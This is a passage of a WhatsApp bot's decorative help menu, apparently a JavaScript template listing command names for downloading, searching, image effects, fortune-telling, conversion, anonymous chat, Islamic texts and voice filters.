┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│〘DOWNLOAD MENU〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│ 〘 SEARCH MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│ 〘 RANDOM MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚞𝚒𝚜𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚒𝚖𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚜𝚋𝚞
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│ 〘 TEKS PRO MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚊𝚌𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚛𝚛𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚐𝚖𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│〘PHOTO OXY MENU〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚘𝚔𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│ 〘 EPHOTO MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚊𝚜𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚊𝚌𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│    〘 FUN MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚖𝚒𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚊𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚕𝚒𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚕𝚞𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚎𝚕𝚎𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚘𝚕𝚘𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│ 〘 PRIMBON MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚜𝚒𝚋
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚛𝚘𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚝𝚘𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚘
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│ 〘 CONVERT MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚝𝚝𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚝𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚐𝚒𝚏
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚞𝚛𝚕
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚖𝚙3
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚎𝚖𝚎
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│   〘 MAIN MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚘𝚠𝚗𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│〘 DATABASE MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│〘ANONYMOUS MENU〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚛𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚡𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│  〘 ISLAMIC MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚚𝚛𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│  〘 VOICE MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚊𝚜𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚎𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚜𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
